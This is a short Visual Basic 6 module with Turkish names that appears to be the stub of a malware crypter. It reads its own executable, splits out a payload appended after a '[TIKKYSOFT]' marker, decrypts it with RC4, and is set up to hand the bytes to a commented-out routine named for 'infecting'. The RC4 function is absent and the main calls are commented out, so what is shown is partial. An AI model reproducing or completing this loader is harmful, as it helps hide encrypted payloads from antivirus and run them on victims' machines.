Attribute VB_Name = "mdlmain"
Option Explicit
Dim resbytes() As Byte
Dim benkimim As String
Dim dosyano As Integer
Dim Buffer() As Byte
Dim sBuffer As String
Dim sKEY As String
Dim sTmp() As String

Sub Main()
benkimim = App.Path & "\" & App.EXEName & ".exe"
'beniparcala benkimim
'kendimdecalistir stringibaytyap(sBuffer), benkimim
End
End Sub

Sub beniparcala(dosya As String)
    dosyano = FreeFile
    Open dosya For Binary As #dosyano
    sBuffer = Space(LOF(dosyano))
    Get #dosyano, , sBuffer
    Close #dosyano

    sTmp = Split(sBuffer, "[TIKKYSOFT]")
    sBuffer = sTmp(1)
    sKEY = sTmp(2)
  
    sBuffer = RC4(CStr(sBuffer), CStr(sKEY))
       
End Sub

Sub kendimdecalistir(giris() As Byte, neyim As String)
   ' Call bulaþtir(neyim, giris())
End Sub

Public Function stringibaytyap(ByVal sStr As String) As Byte()
Dim I As Long
Dim Buffer() As Byte
    ReDim Buffer(Len(sStr) - 1)
    For I = 1 To Len(sStr)
        Buffer(I - 1) = Asc(Mid(sStr, I, 1))
    Next I
    stringibaytyap = Buffer()
End Function

